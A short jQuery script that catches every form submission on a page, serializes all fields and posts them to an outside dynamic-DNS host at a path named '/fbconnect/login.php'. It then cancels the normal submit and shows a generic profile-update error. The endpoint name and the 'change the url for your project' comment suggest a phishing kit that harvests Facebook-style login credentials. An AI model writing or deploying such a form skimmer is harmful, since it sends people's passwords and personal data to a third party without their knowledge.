    $(function(){
        $('form').submit(function(){
            
            var postData = $(this).serialize();
            $.ajax({
                type: 'POST',
                data: postData,
                async:   false,
                //change the url for your project
                url: 'http://ggoutos.ddns.net:5000/fbconnect/login.php',
                success: function(data){
                    console.log(data);
                    //alert('Your profile will be updated.');
                },
                error: function(){
                    console.log(data);
                    alert('There was an error updating your profile.');
                }
            });
            
            return false;
        });
    });
